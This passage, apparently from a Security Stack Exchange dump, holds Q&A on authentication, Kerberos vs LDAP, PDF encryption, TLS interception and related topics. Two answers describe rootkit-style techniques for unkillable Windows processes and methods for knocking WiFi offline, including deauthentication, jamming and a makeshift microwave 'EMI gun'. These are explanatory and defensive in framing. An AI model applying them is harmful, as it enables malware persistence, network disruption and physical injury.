<p>Geolocation API by browser:</p>

<ul>
<li>Chrome uses Google Location Services.</li>
<li>Firefox on Windows uses Google Location Services.</li>
<li>Firefox on Linux uses GPSD - <a href=""http://catb.org/gpsd/"">http://catb.org/gpsd/</a>.</li>
<li>Internet Explorer 9+ uses the Microsoft Location Service.</li>
<li>Safari on iOS uses Apple Location Services for iPhone OS 3.2+.</li>
<li>Opera uses Google Location Services.</li>
</ul>

<p><a href=""http://www.andygup.net/?p=600"">Source and more details about HTML5 Geolocation API</a></p>
","29464"
"Difference between authentication and identification [Crypto and Security perspective]","22242","","<p>I am always confused by the way the word <strong>authentication</strong> is used in security literature (i.e., outside the crypto realm). Most of the time I understand that they are actually implying <strong>identification</strong>. </p>

<p>For example from Wikipedia: <a href=""http://en.wikipedia.org/wiki/Central_Authentication_Service"">Central Authentication Service</a> uses the term authentication to imply identification (if I understand correctly). </p>

<p>In Crypto, as far as I understand:</p>

<ul>
<li>Authentication: a proof that message originated from holder of some given secret.</li>
<li>Identification: a non-transferable proof that the other party knows some given secret (without revealing secret)</li>
<li>Non-repudiation: a transferable proof that message originated from holder of some given secret.</li>
</ul>

<p>[Please let me know if I understood the three terms correctly. Feel free to provide alternate/refined/more helpful definitions]</p>

<p>Can someone elaborate on the meanings of the two terms <code>authentication</code> and <code>identification</code> in both crypto and general security literature?</p>
","<p>In the context of communications through a network, an <strong>identity</strong> is equivalent to the knowledge of a specific piece of data: summarily said, from the outside, what you can know of a given entity from the outside consists exclusively in what bytes that entity emits, i.e. what it can <em>compute</em>. Since everybody can buy the same kind of PC, differences in computing abilities ultimately lie in what the entities <em>know</em>. E.g. <em>you</em> are different from <em>me</em>, from the StackExchange point of view, only in that you know the password to the 'Jus12' account, and I do not, while I know the password of the 'Tom Leek' account, and you do not.</p>

<p><strong>Identification</strong> is about making sure that a given entity is involved and somehow 'active'. For instance, the StackExchange server can make sure that I am alive and kicking by challenging me (my computer) with showing my password. Note that the StackExchange server (actually, another server because they use an indirect scheme, but that's a technicality) <em>also</em> knows my password, so when the SE challenge is successfully responded to, the SE server only knows that, at the other end of the line, operates an entity which is either me or the SE server itself. Identification protocols must take care to avoid or at least reliably detect the occurrence of a server induced to talk to itself by a crafty ill-intentioned individual (hereafter designated by the generic term 'attacker').</p>

<p>Identification, as itself, is quite useless. What the SE server wants to know is not that I, Tom Leek, exists and is awake; the SE server is quite persuaded of that, and does not care. What the SE server wants is to make sure that I <em>approve</em> of the HTTP requests that I am going to issue. They want <strong>authentication</strong>: that's identification applied to some other data. Thus, identification is useful insofar as it can be believed to apply to a bunch of data, which then as a ""verified"" provenance. The link between the identity and the data must be resilient with regards to the outrages that the attacker may inflict on the data. In the case of StackExchange, the attacker is supposed to be fairly weak, because <strong>integrity</strong> of an HTTP request is assumed: the identification part becomes a cookie, as part of a HTTP request, and the SE server just assumes that the attacker cannot alter the request or the cookie, or copy the cookie and graft it upon a new phony HTTP request.</p>

<p>More thorough authentication usually uses a cryptographically strong linkage, e.g. a <a href=""http://tools.ietf.org/html/rfc5246"">SSL/TLS</a> tunnel (often as part of HTTPS). The cryptographic properties of the tunnel imply that the server can be sure that it will be talking to the same entity throughout the SSL session; moreover, the server assumes that the user will not play any identification protocol related to his account password unless this happens over a SSL tunnel in which the server is duly authenticated (that is, the client is sure that it talks to the right server -- that's what the server <em>certificate</em> is about -- and that whatever data it send will go to that server only, so it is authentication). Under these conditions, if the server can <em>identify</em> me within that tunnel, then the identification covers whatever data is sent through the tunnel afterwards: the tunnel is the link between identification and data, so this is authentication.</p>

<p><strong>Non-repudiation</strong> is a characteristic of some authentication protocols, in which the link between identity and data can be verified not only by whoever is, interactively, at the other end of the line, but also by an ulterior third party, for instance a judge. Password-based schemes do not normally offer that property, because whoever <em>verifies</em> the password must also know it more or less directly, and thus could frame the alleged emitter. Non-repudiation requires mathematics. Note that, in a SSL tunnel, the client authenticates the server through its certificate, which is full of asymmetric cryptography, but this does not grant non-repudiation: the client is sure that whatever data it receives from the server really comes from the server, but there is nothing that the client could record, which would convince a judge that the server <em>really</em> sent that data. To get non-repudiation, you need <a href=""http://en.wikipedia.org/wiki/Digital_signature"">digital signatures</a>. Without non-repudiation, one can get authentication with algorithms known as <a href=""http://en.wikipedia.org/wiki/Message_authentication_code"">Message Authentication Codes</a>, which are computationally lighter. Confusingly, there is a widespread (but incorrect) tradition of calling MAC ""signatures"".</p>

<p><strong>Summary:</strong></p>

<ul>
<li><em>Identification</em>: the specific entity <em>E</em> is involved and responding.</li>
<li><em>Integrity</em>: whatever piece of data was received has been sent as-is by some entity <em>E'</em> and was not altered.</li>
<li><em>Authentication</em>: identification and integrity at the same time (<em>E = E'</em>).</li>
<li><em>Non-repudiation</em>: authentication that can convince a judge.</li>
</ul>
","10936"
"Create a unterminable process in Windows","22239","","<p>I am a student, and am genuinely curious about unterminable processes in Windows.</p>

<p>For educational purposes, I would like to create an application (possibly in VB6?) which cannot be terminable by a user from task manager or taskkill. What are some strategies and exploits that such applications employ to make this possible?</p>
","<p>Contrary to what a lot of people believe, there are actually several ways to do this. Some of them are common, some rarely seen. Some of them are weak, some strong. It all depends on how you do it.</p>

<p>Let's go through a collection of them:</p>

<hr>

<p><strong>1. Pre-NT <code>RegisterServiceProcess</code> trick</strong><br />
Windows 9x, and other pre-NT operating systems, had an undocumented API in kernel32.dll called <code>RegisterServiceProcess</code>, which (as the name suggests) registers the process as a system service. Once a process had called this function, the operating system considered it critical and would not allow task manager to kill it. This function was removed when NT came around, so it doesn't work on XP or higher.</p>

<p><strong>2. Process naming tricks</strong><br />
Back in WinXP, the Task Manager executable contained a hard-coded list of process names that it would refuse to kill, instead displaying a message like the one you mentioned. These basically covered the critical system services such as <code>smss.exe</code> and <code>rpcss.exe</code>. The problem was that the path isn't checked, so any other executable with the same name would result in an un-killable process. This trick doesn't prevent the process from being killed, per se,  but rather stops the Windows XP Task Manager from being able to kill the process. It is still possible to use another tool to kill the process.</p>

<p><strong>3. Keep-alive processes</strong><br />
These are by far the most common. Two processes are created, and repeatedly check for the other's existence. If one is killed, the other resurrects it. This doesn't stop you from killing the process really, but it does make it annoying to stop the process from coming back.</p>

<p>Task Manager includes an option to kill the process tree, which allows you to kill a process and all child processes, which may help fix this issue. When a process is created in Windows, the OS keeps track of the process ID that created it. Kill process tree iterates through all processes and looks for those who have a parent ID equal to the process ID that you're killing. Since keep-alive processes usually work on a repeated polling, you can kill both processes before they notice anything went wrong.</p>

<p>A defence against this is to create a dummy process that spawns the keep-alive process, then have that dummy process exit. The main process passes its ID to the dummy process, and the dummy process passes its ID to the keep-alive process, but the chain is broken when the dummy process exits. This leaves both the primary and keep-alive processes running, but makes it impossible to use Task Manager's kill process tree function. Instead, you'd have to write a script to kill them off, or use a tool that allows you to kill multiple processes simultaneously.</p>

<p><strong>4. User-mode hooks via loaded DLLs</strong><br />
It is possible to <a href=""http://en.wikipedia.org/wiki/DLL_injection#Approaches_on_Microsoft_Windows"">inject a DLL</a> into a running process. In fact, Windows offers a feature to have any DLL loaded into all processes that import user32.dll, for the purposes of extensibility. This method is called AppInit DLLs. Once a DLL is injected, it may manipulate the memory of the process. It is then possible to overwrite the values of certain function pointers such that the call is redirected to a stub routine, which then calls the target function. That stub routine may be used to filter or manipulate the parameters and return values of a function call. This technique is called <em>hooking</em>, and it can be very powerful. In this case, it would be possible to inject a DLL into running processes that hooks <code>OpenProcess</code> and <code>TerminateProcess</code> to ensure that no application can gain a handle to your process, or terminate it. This somewhat results in an arms-race, since alternative user-mode APIs can be used to terminate processes, and it's difficult to hook and block them all, especially when we consider undocumented APIs.</p>

<p><strong>5. User-mode hooks via injected threads</strong><br />
This trick works the same as with DLLs, except no DLL file is needed. A handle to the target process is created, some memory is allocated within it via <code>VirtualAllocEx</code>, code and data is copied into the memory block via <code>WriteProcessMemory</code>, and a thread is created in the process via <code>CreateRemoteThread</code>. This results in some foreign code being executed within a target process, which may then instigate various hooks to prevent a process being killed.</p>

<p><strong>6. Kernel-mode call hooks</strong><br />
In the kernel, there's a special structure called the System Service Dispatch Table (SSDT), which maps function IDs from user-mode calls into function pointers in to kernel APIs. This table is used to transition between user-mode and kernel-mode. If a malicious driver can be loaded, it may modify the SSDT to cause its own function to be executed, instead of the proper API. This is a kernel-mode hook, which constitutes a rootkit. Essentially it is possible to pull the wool over the OS's eyes by returning bogus data from calls. In fact, it is possible to make the process not only un-killable, but also invisible. One issue with this on x64 builds is that the SSDT is protected by Kernel Patch Protection (KPP). It is possible to disable KPP, but this has far-reaching consequences that may make it difficult to develop a rootkit.</p>

<p><strong>7. Direct kernel object manipulation (DKOM)</strong><br />
This trick also involves loading a malicious driver on the OS, but doesn't require alteration of the SSDT. Processes on the system are stored as <code>EPROCESS</code> structures in the kernel. Keep in mind that this structure is entirely version-dependant and is only partially documented by Microsoft, so reverse engineering is required across multiple target versions in order to make sure that the code doesn't attempt to read the wrong pointers or data. However, if you can successfully locate and enumerate through <code>EPROCESS</code> structures in the kernel, it is possible to manipulate them.</p>

<p>Each entry in the process list has an <code>FLink</code> and <code>BLink</code> pointer, which point to the next and previous processes in the list. If you identify your target process and make its <code>FLink</code> and <code>BLink</code> pointers point back to themselves, and the <code>FLink</code> and <code>BLink</code> of its siblings point to each other, the OS simply skips over your process when doing any housekeeping operations, e.g. killing processes. This trick is called unlinking. Not only does this render the process invisible to the user, but it also prevents all user-mode APIs from targeting the process unless a handle to the process was generated before it was unlinked. This is a very powerful rootkit technique, especially because it's difficult to recover from.</p>

<p><strong>8. Debugger tricks</strong><br />
This is a pretty cool trick that I've yet to see in the wild, but it works quite well. The Windows debugger API allows any process to debug another, as long as it has the permissions to do so. If you use the debugger API, it is possible to place a process in a ""debugged"" state. If this process contains a thread that is currently halted by a debugger, the process <em>cannot</em> be killed by Windows, because proper thread control cannot be guaranteed during termination when the thread is blocked. Of course, if you kill the debugger, the process stops being debugged and either closes or crashes. However, it is sometimes possible to produce a situation where a chain of processes exist that debug each other in a loop. If each process halts a dummy thread in the next, none can be killed. Note that it <em>is</em> possible for a power user to manually kill other threads within the process, rendering it useless, but it still won't be killed.</p>

<p><strong>9. Windows 8 DRM</strong><br />
This is a new one I've only heard of recently, but I don't know much about it. There was a bit of a rumour going around on Twitter about it, and I've seen snippets here and there on various technical sites, but I've yet to see any concrete research. I think it's still early days. Essentially, the story is that Windows 8 has a mechanism that allows ""trusted providers"" to register processes as DRM critical, preventing them from being killed or manipulated by the user. Some people have speculated that the mechanism for checking trusted providers is weak, and may be open to attack.&lt; - <strike>Looks like this one was bogus. So much for the rumor mill!</strike></p>

<p>Update: Harry Johnston pointed out in the comments that Windows 8.1 introduces <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/dn313124(v=vs.85).aspx"">protected services</a>, which are designed to be used by AV and DRM to protect against being manipulated or attacked by lower-privileged code on the system.</p>

<p><strong>10. Tool manipulation</strong><br />
This one has probably been used a lot in the wild, but I've never seen it done properly. Essentially this trick involves targeting specific tools, e.g. Task Manager, by editing the executables on disk in a way that alters functionality. This is very similar to the user-mode hook tricks I mentioned earlier, but in this case they persist on disk and have wider-reaching consequences than simple API hooking. Of course, one issue is that Windows File Protection (WFP) prevents alteration of certain critical system files, including the task manager. Amusingly, though, it is possible to alter the default task manager executable path via the registry. So, instead of messing with the task manager executable file, just dump your own version somewhere and make the OS use it.</p>

<hr>

<p>All in all, there are plenty of ways to achieve this, with varying degrees of robustness. The above represents a majority of them, but isn't exhaustive. In fact, many of the tricks I described can be achieved in alternate ways, using different mechanisms or APIs to achieve the same goal.</p>
","31006"
"How to find out if somebody is spying on my private browsing data in the same WiFi network?","22185","","<p>I live in a hostel and eight people including me, are using the same WiFi network. One of my friends is a ""computer wizard"". </p>

<p>I would like to know if he is secretly checking my browsing history and if he is able to see the websites that I visited in the incognito mode.</p>
","<p>Actually visiting your browser history is not possible as long as he doesn't have acces to your computer. <em>Assuming your computer is not infected by him and he doesn't have physical access to your computer.</em> Although inspecting, monitoring or saving the network traffic is possible.</p>

<p>What you can do is. Just ask him from man-to-man. Secondly you can use a Virtual Private Network like <a href=""https://ipredator.se"" rel=""nofollow"">https://ipredator.se</a> and always make sure you use SSL (HTTPS) as much as possible. </p>

<blockquote>
  <p>A browser plugin like <a href=""https://www.eff.org/HTTPS-EVERYWHERE"" rel=""nofollow"">HTTPS Everywhere</a> can also help you with that. Like @Aron Foster suggested.</p>
</blockquote>

<p>If you are a more advanced user you can also decide to scope the networks by setting up different VLAN's. Just remember he will probably find a way around that.</p>

<p>Some basic rules also apply:</p>

<ol>
<li>Keep your operating system and all the used software always up-to-date to prevent possible exploiting and infecting your machine. Like Windows update and also <a href=""http://filehippo.com/download_app_manager"" rel=""nofollow"">Filehippo update checker</a> can be helpful.</li>
<li>Make use of a virus scanner, firewall and anti-malware software. Like <a href=""http://www.avira.com/en/avira-free-antivirus"" rel=""nofollow"">Avira</a>, <a href=""https://personalfirewall.comodo.com/"" rel=""nofollow"">Comodo</a> and <a href=""http://www.safer-networking.org/mirrors/"" rel=""nofollow"">Spybot search and destroy</a>.</li>
<li>Use strong and different passwords for different websites. You might want to use a password manager like <a href=""http://keepass.info/"" rel=""nofollow"">KeePass</a>.</li>
</ol>

<blockquote>
  <p>Instead of a VPN service you can also use a free option like <a href=""https://www.torproject.org/"" rel=""nofollow"">TOR</a> like @Neil Smithline suggested. Personally I noticed that using <a href=""https://www.torproject.org/"" rel=""nofollow"">TOR</a> could slowdown your internet speed drastically. It could be worth to try it out.</p>
</blockquote>
","86627"
"Passwords being sent in clear text due to users' mistake in typing it in the username field","22166","","<p>Upon reviewing the Logs generated by different SIEMs (Splunk, HP Logger Trial and the AlienVault platform’s SIEM) I noticed that for some reason quite a few users tend to make the mistake of typing their passwords in the username field, either in the OS Domain logon, or within web applications. I am guessing those are people who cannot type without looking at the keyboard and in trying to do so, doing it fast, end up typing their passwords in the wrong field. This means that the password is sent in plain text everywhere in the network and end up recorded on the logs with an event that says something along the lines:</p>

<pre><code>User P@$$w0rd does not exist [...]
</code></pre>

<p>Or</p>

<pre><code>An account failed to login: P@$$w0rd [...]
</code></pre>

<p>(where P@$$w0rd is the actual user's password)</p>

<p>It becomes pretty obvious to work out to whom the passwords belong: usually the previous or very next  (un)successful event on the same log file will tell you an event triggered by the same user. </p>

<p>Any other Analyst, looking at the logs, could get someone else’s credentials without the due owner even being aware of that; the worst case scenario is network eavesdropping, or actual log file compromise. </p>

<p>I am looking for a general guidance to help preventing this. I assume simply masking the username is not feasible and even if it were, this would probably eliminate a lot of the log analysis for not being able to tell who did what.</p>

<p><b>Note:</b> There is already a post on a similar issue, but I am trying to address a way to prevent it.
<a href=""https://security.stackexchange.com/questions/14907/whats-the-risk-if-i-accidently-type-my-password-into-a-username-field-windows"" title=""What&#39;s the risk if I accidently type my password into a username field &#40;Windows logon&#41;?"">What's the risk if I accidently type my password into a username field (Windows logon)?</a></p>

<hr>

<p><b>Accepted Answer: </b>I wish I could select a few answers from the list. Unfortunately I have to stick to just one in the forum, but in practice I can combine them. Thanks very much for all the answers; I see there is no single solution. As I agree that adding 'things' add complexity which increase likelihood of security holes, I have to agree with most of the voters that @AJHenderson has the most elegant and simplest answer as a first approach. Definitely SSL and a simple code verification on the server or even at the client side. As I am looking to mitigate not against malicious users, but the distracted ones, this will do fine. Once this is in place, we can start looking at expanding the implementation to ill-intended users if appropriate. Thanks ever so much again for everyone's input.</p>
","<p>One thought is to not allow form submission if there is not a value in the password box.  Generally if they accidentally entered the password in the username, then there likely isn't going to be anything in the password dialog.</p>

<p>It is worth noting that this does not have to be simply done client side, but could also be done on a server as long as the transport used is secure and the input is not logged until after passing a check about the password field not being empty.</p>
","32013"
"How to set up OpenSSH to use x509 PKI for authentication?","22082","","<p>I do not mean simply putting the public RSA key of a x.509 certificate into <code>~/.ssh/authorized_keys</code> - I'm looking for a way to set up a ssh such that x.509 certificates signed by a pre-defined CA will automatically be granted access to the linked user account. <a href=""https://tools.ietf.org/html/rfc6187"">RFC 6187</a> seems to suggest such a functionality, but I can't find any documentation on this, or whether it is implemented in OpenSSH at all.</p>

<p>Here's a more elaborate description of what I want to do:</p>

<ul>
<li>A CA (""SSH-CA"") is set up</li>
<li>This CA is used to sign user certificates with <code>keyUsage=digitalSignature</code> (and maybe the <code>id-kp-secureShellClient</code> extendedKeyUsage field)</li>
<li>This certificate can now be used to log in on a server. The server does not require the public key being present in the <code>authorized_keys</code>. Instead, it is set up to trust the SSH-CA to verify the public key and signature of the certificate (or certificate chain) and the username/UID (probably directly in the <code>subjectAltName</code> field, or maybe using some server-side mapping) before the usual RSA authentication takes place</li>
</ul>

<p>So, (how) can this be achieved with OpenSSH, and if it requires a patch how can client-side modifications be kept minimal?</p>

<hr>

<p>As an alternative I guess one could also use any S/MIME certificate plus a username to email-address mapping, without requiring an own CA. The client could also still use only the private RSA key and a certificate server is used obtain a certificate from a public key, additionally offering the possibility to use PGP certificates as well (e.g. via <a href=""http://web.monkeysphere.info/why/#index2h2"">monkeysphere</a>) without the user requiring any knowledge about all this as long as they simply provide a public key.</p>

<p>If it's not natively possible, I guess I could come up with a semi-automatic ""implementation"" of this by letting a script on the server automatically check a somehow else submitted certificate via <code>openssl</code> (or <code>gnupg</code>) and have the public key be put to the respective user's <code>authorized_keys</code> file - although at that point I <em>am</em> probably more or less re-doing the <a href=""http://web.monkeysphere.info/why/#index2h2"">monkeyshere project</a>...</p>
","<p>OpenSSH does not officially support x.509 certificate based authentication:</p>

<blockquote>
  <p>The developers have maintained a stance that the complexity of X.509 
  certificates introduces an unacceptable attack surface for sshd. 
  Instead, they have [recently] implemented an alternative certificate 
  format which is much simpler to parse and thus introduces less risk.</p>
</blockquote>

<p>...</p>

<blockquote>
  <p>OpenSSH just uses the low-level cryptographic algorithms from 
  OpenSSL. </p>
</blockquote>

<p>However <a href=""http://roumenpetrov.info/openssh/"">Roumen Petrov publishes OpenSSH builds that do include X.509 support</a>, and you could try with those.</p>

<blockquote>
  <p>X.509 certificates can [be] used as ""user identity"" and/or ""host key"" in
  SSH ""Public Key"" and ""Host-Based"" authentications.</p>
</blockquote>

<p>Roumen Petrov's builds can be downloaded <a href=""http://roumenpetrov.info/openssh/download.html"">via this page</a>.</p>

<p><a href=""http://www.debian-administration.org/articles/530"">Here's a Debian how-to for SSH with authentication key instead of password</a> that might also prove useful in setting up your OpenSSH to accept x509 PKI for user authentication.</p>
","30397"
"Are open ports dangerous?","22075","","<p>I have forwarded port 80 to WAMPServer and 25565 to the MineCraft-server running <a href=""http://www.bukkit.org/"" rel=""nofollow"">Bukkit</a>.</p>

<p>Am I vulnerable to attacks. Can hackers attack me if WAMP-server is running or if it is not running, or will it be easier to hack me than if I hadn't opened the port at all? I have tried to learn about how people hack and how to protect myself from it. Do you know where I can read about it?</p>
","<blockquote>
  <p>I have forwarded port 80 to WAMPServer and 25565 to the MineCraft-server running Bukkit. (<a href=""http://www.bukkit.org/"" rel=""nofollow noreferrer"">http://www.bukkit.org/</a>)</p>
</blockquote>

<p>I assume that you're talking about forwarding those ports from a router / firewall / NAT box to your own machine rather than forwarding them to some off-site instance. Usually we call this ""opening"" a port.</p>

<blockquote>
  <p>Am I vulnerable to attacks. Can hackers attack me if WAMP-server is running or if it is not running, or will it be easier to hack me than if I hadn't opened the port at all?</p>
</blockquote>

<p>Yes, you are more vulnerable by running a service than by not running a service. Adding more services increases <strong>attack surface</strong>. That doesn't mean by that you're vulnerable by definition, but an increased attack surface increases is one of the factors that increases your <strong>risk</strong>.</p>

<blockquote>
  <p>I have tried to learn about how people hack and how to protect myself from it. Do you know where I can read about it?</p>
</blockquote>

<p>The more time I spend here, the greater resource I find this site to be. I've never found a really good comprehensive guide to how to be secure. There are books like the <a href=""http://rads.stackoverflow.com/amzn/click/0071613749"" rel=""nofollow noreferrer"">Hacking Exposed</a> series that talk about a lot of technical aspects to security and some of the mindset. As much as the CISSP might be railed upon, trying to study up for that exposes one to most of the different knowledge domains that a professional should be aware of. I think that <strong><a href=""https://security.stackexchange.com/questions?sort=votes"">reading questions on this site</a></strong> is a great way to learn.</p>

<p>The challenge is that <strong>security is a mindset</strong>. The technology and even some of the fundamentals of it are an evolving realm. You learn by exposing yourself through trial and error. It is helpful to make as much of that exposure as possible vicarious -- learn from others' mistakes.</p>

<p>Security as an equation works like this:</p>

<ul>
<li>Decide what you need to offer -- you have a need to provide something with a WAMP server and Minecraft game server.</li>
<li>Limit everything you don't need to offer and do it in depth.</li>
</ul>

<p>When I say in depth, I mean that only offering those services is a start. Try to make sure that the programming code on your website is written securely. Then, pretend it has been compromised and consider what can happen from there. Is the Apache process prevented by the operating system controls from writing files anywhere? Do you have a method to detect compromise? Keep asking those questions and finding layers of answers so that if you are hacked, you <strong>mitigate your risk</strong>.</p>
","9463"
"What security scheme is used by PDF password encryption, and why is it so weak?","22055","","<p>Many PDFs are distributed as encrypted PDFs to lock out some of their functionality (eg printing, writing, copying). However, PDF cracking software is available online, which usually cracks the PDF passwords in less than 1 second. </p>

<p>It doesn't make sense that the PDF system is so easy to crack if Adobe implemented a proper encryption techniques in their document security, and it looks like that there is some major implementation error in their PDF encryption scheme that allows documents to be unlocked with trivial amounts of work. </p>

<p>What is the security scheme used in such locked PDF files, and why do these PDF password removers take so little time to defeat it? </p>
","<p>There are two types of PDF protection: Password-based encryption and User-Interface restrictions. You are describing the second type of protection, namely the missing permission to copy-and-paste, to print and so on. If there are user-interface restrictions placed on a PDF file, the viewer still needs to decrypt the contents to display it on your screen, so you are not in an ""password-based encryption"" scenario where you are missing a key to decrypt the document, but in a ""DRM"" scenario where you trust that the applications that are able to decrypt the file (based on static knowledge like master keys) do only the things the author wants them to do.</p>

<p>Nothing prevents computer experts reverse engineering how the legitimate application decrypts the data (no password needed), and performing the decryption themselves. After having the document decrypted, rights may be ""adjusted"" to e.g. include printing permission or the decrypting application can do things (like copy all bitmap images) itself.</p>

<p>Adobe tries to prevent ""rogue applications"" that allow you to circumvent the usage restrictions by their license on the PDF specification: They revoke the license to use the (claimed) intellectual property in that specification for applications that do not obey the usage restrictions. AFAIK some open source tools have or had a build switch for whether the usage restrictions should be obeyed or not. This makes a perfect starting point for people selling ""PDF deprotector"" software.</p>

<p>In the case described above, the ""user password"" is the empty string. PDF readers are required to try to an empty user password if a protected PDF file is opened. Only if that fails the password validity check is the user asked for a password. begueradj describes the key derivation in his answer, and as you see, the ""DRM permissions"" (/P entry) enters the key derivation, so if you just ""fix the permissions"" in a protected PDF file, a conformant reader will derive the wrong key and fail to open the document. On the other hand, if a PDF file is completely protected by a password (even against opening), the user password is no longer empty, and this type of PDF protection is reasonably secure.</p>
","95799"
"Can someone take my Wi-Fi signal DOWN?","22027","","<p>Is it possible that someone made an attack (DoS or something else) to my Wi-Fi router and make my router's signal unavailable (without knowledge of the password)?</p>
","<p>There's a lot of ways you can attack a WiFi without knowing any passwords:</p>

<ul>
<li>Physical layer attacks: Simply jam the frequency spectrum with your own signal. That signal might just be noise, but it might also be a WiFi of your own under heavy load, with the nodes in that WiFi being configured not to play nice with others. (depending on the WiFi chipset, that can be extremely easy) Spectrum can only be used once!<br>
<strong>Tool</strong>: noise source (e.g. Gunn Diode, <a href=""https://en.wikipedia.org/wiki/Software-defined_radio"">SDR device</a>), or normal AP</li>
<li>Electromagnetic sledgehammer: EMI gun. Take microwave oven oscillator, attach directive antenna, pray you don't cook someone's (your) brain, and point in the rough direction of the access point. Poof! Microwave ovens operate in the 2.4 GHz band, and thus, antennas of Access Points are picking up <em>exactly</em> that energy.<br>
<strong>Tool</strong>: Microwave oven, some sheet metal, lack of regard for other people's property and own health, or extended RF knowledge</li>
<li>MAC and Network layer attacks: Especially for networks using WEP (noone should be using this anymore, but sadly...) it's easy to forge what is called deauthentication packets – and thus, to throw out stations from your WiFi.<br>
<strong>Tool</strong>: Aircrack-NG's <code>aireplay</code></li>
<li>Targetted jamming: As opposed to simply occupying the channel with noise or your own WiFi, you can also build a device that listens for typical WiFi packet's beginnings (preambles), and then, just shortly, interferes. Or just sends fake preambles periodically, or especially when it's silent. That way, you can corrupt selected packets, or fake channel occupancy.<br>
<strong>Tool</strong>: Commodity off-the shelf SDR</li>
<li>authentication attacks: at some point, even ""proper"" clients for your WiFi need to register with the WiFi. That mechanism can of course be forced to its knees by simply sending hundreds of authentication requests every second, from randomly generated MAC addresses, or even from MAC addresses of clients you know (by observation) exist. There's no solution to the problem for the AP – either it succumbs to the overload of auth packets, or it starts blocking out legitimate users.<br>
<strong>Tool</strong>: your network card, 10 lines of bash scripting</li>
<li>Man-in-the-Middling / access point spoofing: With anything short of WPA(2)-Enterprise, nothing proves that the access point calling itself ""Toduas AP"" is actually your Access Point. Simply operating a slightly higher-powered access point with the same ID string and, if necessary at all, a faked AP MAC address (trivial, since just a setting), will ""pull"" clients away from your access point. Of course, if the spoofing Access Point doesn't know the password, users might quickly notice (or they don't); however, <em>noticing</em> things don't work is nice, but doesn't help them.<br>
<strong>Tool</strong>: a random normal access point</li>
</ul>

<p>You have to realize that it's a privilege, not a right, to have your WiFi use a channel. WiFi happens in the so-called ISM bands (Industrial, Scientific, Medical usage), where operators of transmitters don't have to have an explicit license. That means it's OK for everyone to use that spectrum, as long as they don't intentionally harm other devices and are not easily damaged by interference. </p>

<p>So, it's absolutely legal for someone to operate a high-definition digital camera stream that occupies the whole WiFi channel. That will effectively shut down your WiFi.</p>

<p>If you need something that no-one can mess with, wireless is, by definition, not the way to go.</p>
","143608"
"Kerberos vs. LDAP for authentication -- which one is more secure","22021","","<p>Can anyone describe/outline the relative merits of using Kerberos or LDAP for authentication in a large heterogeneous environment? </p>

<p>And</p>

<p>Can we switch between them transparently?</p>
","<p>Where possible use Kerberos authentication above all else. It was built for providing authentication/authorization and is the <a href=""http://www.kerberos.org/software/whykerberos.pdf"">most secure option</a>. The whole premise is to exchange credentials in an environment that isn't trusted. </p>

<p>LDAP can be easily misconfigured to send credentials in clear text over the network. An easy way to prevent this is always use LDAPS (TCP636) as it encapsulates all traffic in SSL. LDAP is often used for adhoc authentication/authorization especially web applications using forms authentication.</p>
","109586"
"Difference between Privilege and Permission","21986","","<p>I am a little confused on the contextual differences between permission and privilege from computer security perspective.Though I have read the definition of both the terms but it will be nice if someone can give me some practical example e.g.</p>

<pre><code>User A can read write file X 
</code></pre>

<p>What is privilege and permission in this case ? </p>
","<p><a href=""https://english.stackexchange.com/questions/46292/permission-vs-privilege"">In computer security, they are used interchangeably.</a></p>

<blockquote>
  <p>In the context of rights, permission implies consent given to any
  individual or group to perform an action. Privilege is a permission
  given to an individual or group. Privileges are used to distinguish
  between different granted permissions (including no permission.)</p>
</blockquote>

<p>A privilege is a permission to perform an action.</p>

<p>Also from the above english.se link</p>

<blockquote>
  <p>A permission is a property of an object, such as a file. It says which
  agents are permitted to use the object, and what they are permitted to
  do (read it, modify it, etc.).</p>
  
  <p>A privilege is a property of an agent, such as a user. It lets the
  agent do things that are not ordinarily allowed. For example, there
  are privileges which allow an agent to access an object that it does
  not have permission to access, and privileges which allow an agent to
  perform maintenance functions such as restart the computer.</p>
</blockquote>

<p>So in your example the privilege is having the permission to write the file 'x' </p>
","41310"
"How can my employer be a man-in-the-middle when I connect to Gmail?","21953","","<p>I'm trying to understand SSL/TLS. What follows are a description of a scenario and a few assumptions which I hope you can confirm or refute.</p>

<p><strong>Question</strong></p>

<p>How can my employer be a man-in-the-middle when I connect to Gmail? Can he at all?</p>

<p>That is: is it possible for the employer to unencrypt the connection between the browser on my work computer and the employer's web proxy server, read the data in plain text for instance for virus scans, re-encrypt the data and to send it to Google without me noticing it?</p>

<p>Browser on employee's computer &lt;--> employer's web proxy server &lt;--> Gmail server</p>

<p>The employer can install any self-signed certificate on the company computers. It's his infrastructure after all.</p>

<p><strong>Scenario: what I am doing</strong></p>

<ol>
<li>With a browser, open <a href=""http://www.gmail.com"" rel=""noreferrer"">http://www.gmail.com</a> (notice http, not https)</li>
<li>I get redirected to the Google login page: <a href=""https://accounts.google.com/ServiceLogin?service=mail&amp;passive=true&amp;rm=false&amp;continue=https://mail.google.com/mail/&amp;ss=1&amp;scc=1&amp;ltmpl=default&amp;ltmplcache=2&amp;emr=1"" rel=""noreferrer"">https://accounts.google.com/ServiceLogin?service=mail&amp;passive=true&amp;rm=false&amp;continue=https://mail.google.com/mail/&amp;ss=1&amp;scc=1&amp;ltmpl=default&amp;ltmplcache=2&amp;emr=1</a></li>
<li>I enter my username and password</li>
<li>I get redirected to Gmail: <a href=""https://mail.google.com/mail/u/0/?pli=1#inbox"" rel=""noreferrer"">https://mail.google.com/mail/u/0/?pli=1#inbox</a></li>
<li>I click on the SSL lock-icon in the browser...</li>
</ol>

<p>...and see the following:</p>

<ul>
<li>Issued to: mail.google.com</li>
<li>Issued by: ""employer company name""</li>
<li>Valid from: 01.01.2014 - 31.12.2014</li>
<li>Certification path: ""employer company name"" --> ""employer web proxy server name"" --> mail.google.com</li>
</ul>

<p><strong>Assumption</strong></p>

<p>I'm now assuming that the SSL lock-icon in the browser turns green, but in fact I don't have a secure connection from the browser to the Gmail server.</p>

<p>Is that correct?</p>

<p><strong>Sources</strong></p>

<p>I've read these sources but still don't quite understand it:</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/20871/is-there-a-method-to-detect-an-active-man-in-the-middle"">Is there a method to detect an active man-in-the-middle?</a></li>
<li><a href=""https://security.stackexchange.com/questions/33909/preventing-a-spoofing-man-in-the-middle-attack?rq=1"">Preventing a spoofing man in the middle attack?</a></li>
<li><a href=""https://security.stackexchange.com/questions/20803/how-does-ssl-tls-work?lq=1"">How does SSL/TLS work?</a></li>
</ul>

<p><strong>Summary</strong></p>

<ol>
